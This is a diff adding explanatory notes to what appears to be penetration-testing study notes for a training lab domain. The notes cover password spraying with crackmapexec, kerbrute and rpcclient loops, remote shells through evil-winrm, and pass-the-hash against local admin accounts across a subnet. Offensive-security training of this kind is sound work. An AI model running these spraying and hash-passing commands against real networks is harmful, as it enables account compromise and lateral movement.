@@ -21,6 +21,7 @@ nxc smb 172.16.5.5 -u avazquez -p Password123
 evil-winrm -i 172.16.5.5 -u avazquez -p Password123
 crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --shares
 ```
+> Always get the password policy first — one wrong number of attempts locks accounts. `crackmapexec smb` sprays the password against every username in the file. `| grep +` hides all the failures so only successful logins appear. Always validate hits and immediately test them against WinRM and SMB shares.
 
 ---
 
@@ -39,6 +40,7 @@ crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --shares
 ```bash
 crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
 ```
+> Pass the username file with `-u` and a single password with `-p`. CrackMapExec tries every username. `| grep +` filters to only show lines with a `+` which marks successful logins.
 
 `| grep +` = only shows successes, filters all failures. Essential for large lists.
 
@@ -49,6 +51,7 @@ crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
 ```bash
 kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
 ```
+> Sprays one password against all usernames using Kerberos instead of SMB. Faster than rpcclient. Note: failed spray attempts **do count** toward the lockout threshold, unlike username enumeration.
 
 Faster than rpcclient. Failed attempts count toward lockout threshold.
 
@@ -59,6 +62,7 @@ Faster than rpcclient. Failed attempts count toward lockout threshold.
 ```bash
 for u in $(cat valid_users.txt); do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
 ```
+> Loops through every username and tries to log in via RPC with the given password. `-c "getusername;quit"` runs a command and exits immediately. `grep Authority` shows only the lines that contain a successful authentication response.
 
 `grep Authority` = shows only successful logins.
 
@@ -73,6 +77,7 @@ If you recover a local admin hash or password, spray it across the subnet:
 crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H NTLM_HASH | grep +
 # Pwn3d! = local admin access confirmed
 ```
+> `--local-auth` authenticates as a local account instead of a domain account. This is critical — without it, failed attempts can lock out the domain account. `-H` accepts an NTLM hash instead of a plaintext password. `Pwn3d!` in the output means you have local admin on that host.
 
 **Naming pattern tips:**
 - Password on workstation → try similar pattern on servers
